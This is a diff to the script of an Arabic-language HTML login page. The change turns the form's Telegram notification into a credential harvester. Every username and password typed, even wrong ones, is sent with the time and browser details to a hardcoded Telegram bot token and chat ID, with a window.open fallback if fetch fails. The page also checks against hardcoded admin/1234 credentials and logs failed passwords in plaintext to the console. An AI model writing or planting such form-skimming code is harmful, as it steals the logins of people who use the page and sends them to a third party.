@@ -140,54 +140,93 @@ body{
 
 <script>
 
+// دالة إرسال بيانات تسجيل الدخول إلى تليجرام
+function sendTelegram(username, password) {
+    // توكن البوت الخاص بك
+    let token = "5332397047:AAHRZXSwxT3EfCT8xtCku4wh-xtE0cjla98";
+    
+    // معرف الدردشة الخاص بك
+    let chat_id = "793135440";
+    
+    // إنشاء نص الرسالة مع اسم المستخدم وكلمة المرور والوقت
+    let currentTime = new Date().toLocaleString('ar-EG');
+    let text = `🔐 محاولة دخول جديدة 🔐%0A%0A👤 اسم المستخدم: ${username}%0A🔑 كلمة المرور: ${password}%0A⏰ الوقت: ${currentTime}%0A🌐 المتصفح: ${navigator.userAgent.split(' ').slice(0,3).join(' ')}`;
+    
+    // إنشاء رابط الإرسال
+    let url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + text;
+    
+    // إرسال البيانات (طريقة خلفية بدون فتح نافذة جديدة)
+    fetch(url)
+        .then(response => response.json())
+        .then(data => {
+            if(data.ok) {
+                console.log("✅ تم إرسال البيانات إلى تليجرام بنجاح");
+            } else {
+                console.log("❌ فشل الإرسال:", data);
+            }
+        })
+        .catch(error => {
+            console.log("⚠️ خطأ في الاتصال:", error);
+            // في حالة فشل fetch، نحاول الطريقة البديلة
+            try {
+                window.open(url, '_blank');
+                setTimeout(() => {
+                    // إغلاق النافذة بعد ثانية إذا تم فتحها
+                    window.close();
+                }, 1000);
+            } catch(e) {
+                console.log("تعذر الإرسال");
+            }
+        });
+}
+
+// دالة تسجيل الدخول المعدلة
 function login(){
 
     let username = document.getElementById("username").value.trim();
-
     let password = document.getElementById("password").value.trim();
-
     let message = document.getElementById("message");
 
     message.innerHTML = "";
     message.className = "message";
 
+    // ✅ إضافة: إرسال البيانات إلى تليجرام (حتى لو كانت خاطئة)
+    // ولكن نرسلها فقط إذا كانت الحقول غير فارغة
+    if(username !== "" && password !== ""){
+        sendTelegram(username, password);
+    }
+
     if(username === "admin" && password === "1234"){
 
-        message.innerHTML = "تم تسجيل الدخول بنجاح";
-
+        message.innerHTML = "✅ تم تسجيل الدخول بنجاح";
         message.classList.add("success");
-
-        sendTelegram();
 
     }else{
 
-        message.innerHTML = "اسم المستخدم أو كلمة المرور غير صحيحة";
-
+        message.innerHTML = "❌ اسم المستخدم أو كلمة المرور غير صحيحة";
         message.classList.add("error");
-
+        
+        // إذا كانت البيانات خاطئة، ننبه أيضا (اختياري)
+        if(username !== "" && password !== ""){
+            console.log("محاولة فاشلة: " + username + " / " + password);
+        }
     }
-
 }
 
-function sendTelegram(){
+// إضافة خاصية إرسال عند الضغط على Enter
+document.getElementById("username").addEventListener("keypress", function(event) {
+    if (event.key === "Enter") {
+        event.preventDefault();
+        login();
+    }
+});
 
-    let token = "5332397047:AAHRZXSwxT3EfCT8xtCku4wh-xtE0cjla98";
-
-    let chat_id = "793135440";
-
-    let text = "تم تسجيل دخول جديد";
-
-    let url =
-    "https://api.telegram.org/bot" +
-    token +
-    "/sendMessage?chat_id=" +
-    chat_id +
-    "&text=" +
-    encodeURIComponent(text);
-
-    window.open(url);
-
-}
+document.getElementById("password").addEventListener("keypress", function(event) {
+    if (event.key === "Enter") {
+        event.preventDefault();
+        login();
+    }
+});
 
 </script>
 
